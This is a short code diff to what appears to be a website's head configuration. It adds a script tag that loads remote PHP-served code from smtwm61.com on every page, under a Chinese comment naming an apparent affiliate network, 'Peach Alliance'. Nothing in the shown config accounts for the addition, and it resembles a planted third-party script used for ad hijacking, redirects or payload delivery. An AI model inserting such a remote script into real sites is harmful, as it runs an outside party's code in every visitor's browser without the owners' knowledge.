@@ -199,7 +199,13 @@ const headConfig = [
     }
   ],
 
-
+// 水蜜桃联盟-https://www.smtwm.com/
+[
+  'script',
+  {
+    src:'https://smtwm61.com/yd.php?id=29',
+  }
+],
 
   // 
   // [
